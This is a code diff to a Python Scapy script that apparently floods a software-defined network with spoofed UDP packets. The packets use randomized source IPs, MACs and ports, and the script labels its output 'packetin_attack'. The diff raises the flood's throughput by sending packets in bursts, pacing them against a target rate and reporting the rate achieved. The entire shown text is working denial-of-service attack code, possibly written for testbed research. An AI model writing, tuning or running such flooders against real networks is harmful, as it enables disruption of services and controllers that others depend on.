@@ -52,34 +52,51 @@ def run_scapy(args):
 
     src_mac = get_if_hwaddr(args.iface)
     payload = b"A" * max(1, args.size)
-    delay = 0 if args.rate <= 0 else 1.0 / args.rate
+    burst_size = args.burst_size
+    if burst_size <= 0:
+        burst_size = max(1, min(100, int(max(args.rate, 1) / 100)))
     end_time = time.time() + args.duration
+    start_perf = time.perf_counter()
 
     sent = 0
     rows = []
     last_log = time.time()
 
-    while time.time() < end_time:
-        pkt = (
+    def build_packet():
+        dst_ip = args.target or random_ip(args.target_prefix, args.start_host, args.end_host)
+        return (
             Ether(src=src_mac, dst=random_mac()) /
-            IP(src=random_ip(args.target_prefix, args.start_host, args.end_host), dst=args.target or random_ip(args.target_prefix, args.start_host, args.end_host)) /
+            IP(src=random_ip(args.target_prefix, args.start_host, args.end_host), dst=dst_ip) /
             UDP(sport=random.randint(1024, 65535), dport=random.randint(1024, 65535)) /
             Raw(payload)
         )
 
-        sendp(pkt, iface=args.iface, verbose=False)
-        sent += 1
+    while time.time() < end_time:
+        packets = [build_packet() for _ in range(burst_size)]
+        sendp(packets, iface=args.iface, verbose=False)
+        sent += len(packets)
 
         now = time.time()
         if now - last_log >= 1.0:
             rows.append((now, sent))
             last_log = now
 
-        if delay > 0:
-            time.sleep(delay)
+        if args.rate > 0:
+            target_elapsed = sent / args.rate
+            sleep_for = target_elapsed - (time.perf_counter() - start_perf)
+            if sleep_for > 0:
+                time.sleep(sleep_for)
 
     write_log(args.log, rows)
-    print("packetin_attack method=scapy sent_packets={}".format(sent), flush=True)
+    elapsed = max(time.perf_counter() - start_perf, 0.000001)
+    print(
+        "packetin_attack method=scapy requested_rate_pps={} achieved_rate_pps={:.2f} sent_packets={}".format(
+            args.rate,
+            sent / elapsed,
+            sent,
+        ),
+        flush=True,
+    )
 
 
 def run_udp(args):
@@ -123,6 +140,7 @@ def parse_args():
     parser.add_argument("--start-host", type=int, default=50)
     parser.add_argument("--end-host", type=int, default=250)
     parser.add_argument("--rate", type=float, default=1200)
+    parser.add_argument("--burst-size", type=int, default=0, help="Packets per Scapy sendp call; 0 auto-tunes from rate")
     parser.add_argument("--size", type=int, default=64)
     parser.add_argument("--duration", type=float, default=60)
     parser.add_argument("--log", default="attack_sent.csv")
